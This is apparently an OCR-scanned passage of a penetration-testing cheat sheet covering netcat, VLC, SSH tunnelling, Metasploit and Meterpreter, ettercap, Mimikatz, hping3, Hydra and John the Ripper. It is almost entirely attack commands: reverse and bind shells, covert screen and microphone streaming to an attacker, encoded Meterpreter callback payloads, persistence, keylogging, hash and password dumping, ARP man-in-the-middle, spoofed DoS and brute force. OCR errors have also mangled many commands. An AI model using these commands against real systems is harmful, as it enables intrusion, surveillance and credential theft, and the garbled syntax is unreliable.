or OR II
xor OR
not OR !
52
NET CAT
BAs :res
Connect to [TargetiP] Listener on [port]:
$ nc [ Targeti P] [port]
Start Listener:
$ nc -1 -p [port]
PORT SCANNER
TCP Port Scanner in port range [startPort] to [endPort]:
$ nc -v -n -z -wl [TargetiP] [startPort]-[endPort]
Fl:LE TRANSFERS
Grab a [filename] from a Listener:
1. Start Listener to push [filename]
$ nc -1 -p [port] [filename]
2. Connect to [TargetiP] and Retrieve [filename]
$ nc -w3 [TargetiP] [port] [filename]
Push a [filename] to Listener:
1. Start Listener to pull [filename]
$ nc -1 -p [port] [filename]
2. Connect to [TargetiP] and push [filename]
$nc -w3 [TargetiP] [port] [filename]
BACKDOOR SHELLS
Linux Shell:
$ nc -1 -p [port] -e /bin/bash
Linux Reverse Shell:
$ nc [LocaliP] [port] -e /bin/bash
Windows Shell:
$ nc -1 -p [port] -e cmd.exe
Windows Reverse Shell:
$ nc [LocaliP] [port] -e cmd.exe
53
VLC STREAMING
# Use cvlc (command line VLC) on target to mitigate popups
CAPTURE AND STREAM THE SCREEN OVER UDP TO : 1234
# Start a listener on attacker machine
vlc udp://@:1234
OR -
# Start a listener that stores the stream in a file.
vlc udp://@:1234 :sout=#transcode{vcodec=h264,vb=O,scale=O,acodec=mp4a,
ab=128,channels=2,samplerate=44100):file{dst=test.mp4) :no-sout-rtp-sap
:no-sout-standard-sap :ttl=1 :sout-keep
# This may make the users screen flash. Lower frame rates delay the video.
vlc screen:// :screen-fps=25 :screen-caching=100
:sout=#transcode{vcodec=h264,vb=O,scale=O,acodec=mp4a,ab=128,channels=2,sam
plerate=44100):udp{dst= attackerip :1234) :no-sout-rtp-sap :no-sout
standard-sap :ttl=1 :sout-keep
CAPTURE AND STREAM THE SCREEN OVER HTTP
# Start a listener on attacker machine
vlc http://server.example.org:BOBO
-- OR -
# Start a listener that stores the stream to a file
vlc http://server.example.org:BOBO -
sout=#transcode{vcodec=h264,vb=O,scale=O,acodec=mp4a,ab=128,channels=2,samp
lerate=44100):file{dst=test.mp4)
# Start streaming on target machine
vlc screen:// :screen-fps=25 :screen-caching=100
:sout=#transcode{vcodec=h264,vb=O,scale=O,acodec=mp4a,ab=128,channels=2,sam
plerate=44100):http{mux=ffmpeg{mux=flv),dst=:8080/) :no-sout-rtp-sap :no
sout-standard-sap :ttl=1 :sout-keep
CAPTURE AND STREAM OVER BROADCAST
# Start a listener on attacker machine for multicast
vlc udp://@ multicastaddr :1234
# Broadcast stream to a multicast address
vlc screen:// :screen-fps=25 :screen-caching=100
:sout=#transcode{vcodec=h264,vb=O,scale=O,acodec=mp4a,ab=128,channels=2,sam
plerate=44100):udp{dst= multicastaddr :1234) :no-sout-rtp-sap :no-sout
standard-sap :ttl=1 :sout-keep
CAPTURE AND RECORD YOUR SCREEN TO A F:ILE
vlc screen:// :screen-fps=25 :screen-caching=100
:sout=#transcode{vcodec=h264,vb=O,scale=O,acodec=mp4a,ab=128,channels=2,sam
plerate=44100):file{dst=C:\\Program Files (x86)\\VideoLAN\\VLC\\test.mp4)
:no-sout-rtp-sap :no-sout-standard-sap :ttl=1 :sout-keep
CAPTURE AND STREAM THE M:ICROPHONE OVER UDP
vlc dshow:// :dshow-vdev=11None" :dshow-adev="Your Audio Device11
54
SSH
/etc/ssh/ssh known hosts #System-wide known hosts
-/.ssh/known=hosts- #Hosts user has logged into
sshd-generate #Generate SSH keys (DSA/RSA)
ssh keygen -t dsa -f /etc/ssh/ssh host dsa key #Generate SSH DSA keys
ssh keygen -t rsa -f /etc/ssh/ssh=host=rsa key #Generate SSH RSA keys
~ If already in ssh session, press SHIFT -C to configure tunnel
~ Port forwarding must be allowed on target
~ /etc/ssh/sshd_config - AllowTcpForwarding YES
TO ESTABLISH AN SSH CONNECTION ON DIFFERENT PORT
ssh root@2.2.2.2 -p 8222
SETUP Xll FORWARDING FROM TARGET, FROM ATTACK BOX RUN
xhost+
vi -/.ssh/config- Ensure 'ForwardXll yes'
ssh -X root@2.2.2.2
REMoTE PORT FORWARD ON 808 0 , FORWARD TO ATTACKER ON 4 43
ssh -R8080:12-.0.0.1:443 root@2.2.2.2.
LoCAL PORT FORWARD ON PORT 8080 ON ATTACK BOX AND FORWARDS
THROUGH SSH TUNNEL TO PORT 3300 ON INTERNAL TARGET 3. 3. 3. 3
ssh -18080:3.3.3.3:443 root@2.2.2.2
DYNAMIC TUNNEL USED IN CONJUNCTION WITH PROXYCHAINS . ENSURE
/ETC/PROXYCHAINS. CONF IS CONFIGURED ON CORRECT PORT (1080)
ssh -Dl080 root@2.2.2.2
In a separate terminal run:
proxychains nmap -sT -p80,443 3.3.3.3
55
METASPLOIT
msfconsole r file.rc Load resource file
msfcli I grep exploit/window List Windows exploits
rnsfencode 1 List available encoders
msfpayload h List available payloads
show exploits Display exploits
show auxiliary Display auxiliary modules
show payloads Display payloads
search string Search for string
info module Show module information
use module Load exploit or module
show options Displays module options
show advanced Displays advanced options
set option value Sets a value
sessions -v List session: -k # (kill)
-u # (upgrade to Meterpreter)
sessions -s script Run Meterpreter script on all
sessions
jobs -1 List all jobs (-k # - kill)
exploit -j Run exploit as job
route add ip nmask sid Pivoting
loadpath /home/modules Load 3rd party tree
irb Live Ruby interpreter shell
connect -s ip 443 SSL connect (NC clone I
route add ip mask session id Add route ·through session (pivot)
exploit/multi/handler - set Advanced option allows for multiple
ExitOnSession False shells
set ConsoleLogging true (also Enables logging
SessionLogging)
CREATE ENCODED METERPRETER PAYLOAD (FOR LINUX: -T ELF -o
CALLBACK)
./msfpayload windows/meterpreter/reverse tcp LHOST~ ip LPORT~ port R I
./msfencode -t exe -o callback.exe -e x86/shikata_ga nai -c 5
CREATE BIND METERPRETER PAYLOAD
./msfpayload windows/meterpreter/bir.d_tcp RP.OST~ ip LPORT~ port X
cb.exe
CREATE ENCODED PAYLOAD USING MSFVENOM USING EXE TEMPLATE
./msfvenorn --payload windows/meterpreter/reverse~tcp --format exe
template calc.exe -k --encoder x86/shikata ga nai -i 5 LHOST~l.l.l.l
LPORT~443 callback.exe
56
START MSF DB (BT5 = MYSQL, KAL:r = POSTGRESQL)
/etc/rc.d/rc.mysqld start
msf db_create root:pass@localhost/metasploit
msf load db mysql
msf db connect root:pass@localhost/metasploit
msf db=import nmap.xml
Kali ---
# service postgresql start
# service metasploit start
PASS A SHELL (BY DEFAULT WJ:LL LAUNCH NOTEPAD AND :INJECT)
msf use post/windows/manage/multi meterpreter inJect
msf set IPLIST attack ip -
msf set LPORT callback port
msf set PIDLIST PID to inject, default creates new notepad
msf set PAYLOAD windows/meterpreter/reverse_tcp
msf set SESSION meterpreter session ID
HTTP BANNER SCAN ON :INTERNAL NETWORK
msf route add ip/range netmask meterpreter ID
msf use post/multi/gather/ping sweep # Set options and run
msf use /auxiliary/scanner/portscan/tcp # Set options and run
msf hosts-u-S x.x.x -R #Searches for x.x.x.' and sets
# RHOSTS
msf use auxiliary/scanner/http/http version # Set options and run
msf services -v -p 80-S x.x.x -R - #Displays IPs x.x.x.' with port
# 80 open
57
METERPRETER
help List available commands
sysinfo Display system info
ps List processes
getpid List current PID
upload file C:\\Program\ Files\\ Upload file
download file Download file
reg command Interact with registry
rev2self Revert to original user
shell Drop to interactive shell
migrate PID Migrate to another PID
background Background current session
keys can (startjstopjdumpj Start/Stop/Dump keylogger
execute -f cmd.exe -i Execute cmd.exe and interact
execute -f crnd.exe -i -H -t Execute cmd.exe as hidden process
and with all tokens
has dump Dumps local hashes
run script Executes script
(/scripts/meterpreter)
port fwd [add I delete] L 1r.o.o.1 1 Port forward 3389 through session. I
443 -r 3.3.3.3 -p 3389 Rdesktop to local port 443
PRIVILEGE ESCALATION
use priv
getsystem
IMPERSONATE TOKEN (DROP TOKEN WILL STOP IMPERSONATING)
use incognito
list tokens -u
impersonate token domain\\user
NMAP THROUGH METERPRETER SOCKS PROXY
1. msf sessions #Note Meterpreter ID
2. msf route add 3.3.3.0 255.255.255.0 id
3. msf use auxiliarJ/server/socks4a
4. rnsf run
5. Open new shell and edit /etc/proxychains.conf
i. #proxy_d ns
ii. #socks4 1r.0.0.1 9050
iii. socks4 1. 1.1.1 1080
6. Save and Close conf fi:e
proxychains nmap -sT -Pn -p80,:35,s45 3.3.3.3
RAILGUN - WINDOWS API CALLS TO POP A MESSAGE BOX
rneterprete~ irb
client. railgun. user32. t.jessageBoxA ( 0, "got", 11JOU", "HB ~OK")
58
CREATE PERSXSTENT WrNDOWS SERVICE
msf use post/windows/manage/persistence
msf· set LHOST attack ip
msf set LPORT callback port
msf. set PAYLOAD_TYPE TCPIHTTPIHTPS
msf.· set REXENAHE filename
msf set SESSION meterpreter session id
msf. set STARTUP SERVICE
GATHER RECENTLY ACCESSED FXLES AND WEB LXNKS
meterpreter run post/windows/gather/dumplinks
SPAWN NEW PROCESS AND TREE C: \
execute -H -f cmd.exe -a '/c tree /F /A c:\ C:\temp\tree.txt'
59
ETTERCAP
~-IN-THE-MIDDLE WITH FILTER
ettercap.exe -I iface -M arp -Tq -F file.ef MACs I IPs I Ports
t1ACs I IPs I Ports
#i.e.: I 180,443 I I ~ anJ t1AC, anj IP, ports 80,443
~-IN-THE-MIDDLE ENTIRE SUBNET WITH APPLIED FILTER
ettercap -T -M arp -F filter II II
SWITCH FLOOD
ettercap -TP rand flood
ETTERCAP FILTER
COMPILE ETTERCAP FILTER
etterfilter filter.filter -o out.ef
SAMPLE FILTER - KILLS VPN TRAFFIC AND DECODES HTTP TRAFFIC
if lip.proto ~~ UDP && udp.dst ~~ 500) I
drop I I;
hllll; }
if I ip. src ~~ ' ip ' ) (
if ltcp.dst ~~ 80) (
if lsearchiDATA.data, "Accept-Encoding")) (
replace("Accept-Encoding","Accept-Rubbish!");
rnsg(''Replaced Encoding\n'');
60
MIMIKATZ
1. Upload mimikatz.exe and sekurlsa.dll to target
2. execute mirnikatz
3. mimikatz# privilege: :debug
4. mimikatz# injeet::proeess lsass.exe sekurlsa.dll
5. mimikatz# @getLogonPasswords
HPING3
DoS FROM SPOOFED IPs
hping3 targetiP --flood --frag --spoof ip --destport # --syn
ARPING
ARP SCANNER
./arping -I eth# -a # arps
WINE
COMPILE EXE IN BACKTRACK
ed /root/.wine/drive e/HinGW/bin
wine gee -o file.exe /tmp/ eode.e
wine file.exe
GRUB
CHANGE ROOT PASSWORD
GRUB Henu:Add 'single' end of kernel line. Reboot. Change root pass. reboot
HYDRA
ONLINE BRUTE FORCE
hydra -1 ftp -P words -v targetiP ftp
61
JOHN THE RIPPER
CRACKING WITH A WORDLIST
$ ./john -wordfile:pw.lst -format: format hash.txt
FORMAT EXAMPLES
john --format~des username:SDbsuge8iC58A
john --format~lm username:$L~$a9c604d244c4e99d
john --format~md5 $1$12345678$aiccj83HRD8o6ux1bVx"D1
$ john --format~raw-sha1 A9993E364-06816A8A3E25"1-850C26C9CDOD89D
# For --format~netlmv2 replace $NETLM with $NETLMv2
$ john --format~netlm
$NETLt1$112233445566""88$0836F0858124F338958-5F81951905DD2F85252CC-318825
username:$NETLt1$ll2233445566""88$0836F0858124F338958"5F81951905DD2F85252CC"
318825
username:$NETLt1$112233445566""88$0836F0858124F338958-5F81951905DD2F85252CC"
318825:::::::
# Exactly 36 spaces between USER and HASH (SAP8 and SAPG)
$ john --format~sapb
ROOT $8366A4E9E68"2C80
username:ROOT $8366A4E9E68"2C80
$ john --format~sapg
ROOT $1194E38F1489F3F8DA18181F14DE8"0E"8DCC239